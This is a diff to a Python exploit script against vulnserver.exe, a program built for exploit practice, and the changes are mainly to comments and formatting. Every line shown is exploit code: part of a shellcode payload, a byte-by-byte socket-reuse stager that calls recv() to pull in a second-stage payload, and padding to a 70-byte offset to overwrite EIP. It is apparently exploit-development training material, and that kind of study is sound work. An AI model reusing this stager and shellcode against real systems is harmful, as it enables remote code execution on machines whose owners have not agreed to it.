@@ -39,43 +39,42 @@ shell += "\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
 shell += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
 
 
-# 2000 bytes to crash vulnserver.exe
-# Padding
+# some padding
 setrecv = "\x41" * 2
 
-# Creating socket descriptor = 0x0000007c
-setrecv += "\x31\xc9"			# xor ecx, ecx
+# Creating socket descriptor reference = 0x0000007c
+setrecv += "\x31\xc9"			    # xor ecx, ecx
 setrecv += "\x80\xc1\x7c"			# add cl, 0x7c
-setrecv += "\x51"				# push ecx
-setrecv += "\x89\xe7"			# mov edi, esp
+setrecv += "\x51"				      # push ecx
+setrecv += "\x89\xe7"			    # mov edi, esp
 
-# Move ESP out of the way
+# Stack Alignment
 setrecv += "\x83\xec\x50"			# sub esp, 0x50
 
 # Flags = 0x00000000
-setrecv += "\x31\xd2"			        # xor edx,edx
-setrecv += "\x52"				# push edx
+setrecv += "\x31\xd2"			    # xor edx,edx
+setrecv += "\x52"				      # push edx
 
 # BufSize = 0x00000200
 setrecv += "\x80\xc6\x02"			# add dh, 0x02
-setrecv += "\x52"				# push edx
+setrecv += "\x52"				      # push edx
 
 # Buffer = 0x00C0F9F0
-setrecv += "\x54"				# push esp
-setrecv += "\x5b"				# pop ebx
+setrecv += "\x54"				      # push esp
+setrecv += "\x5b"				      # pop ebx
 setrecv += "\x83\xc3\x4c"			# add ebx, 0x4c
-setrecv += "\x53"				# push ebx
+setrecv += "\x53"				      # push ebx
 
 # Push socket descriptor onto the stack:
 setrecv += "\xff\x37"				# push dword ptr ds:[edi]
 
 # Calling W2_32.recv()
-setrecv += "\xB8\x11\x2C\x25\x40"           	# mov eax, 0x40252C11
-setrecv += "\xc1\xe8\x08"                   	# shr eax, 0x08
-setrecv += "\xff\xd0"                           # call eax
+setrecv += "\xB8\x11\x2C\x25\x40"      # mov eax, 0x40252C11
+setrecv += "\xc1\xe8\x08"              # shr eax, 0x08
+setrecv += "\xff\xd0"                  # call eax
 
 # 70 byte offset to EIP
-paddingeip = "\x41" * (70-len(setrecv))              # offset to EIP
+paddingeip = "\x41" * (70-len(setrecv))     # offset to EIP
 
 eax = "\x0C\x10\x40\x00"       
 
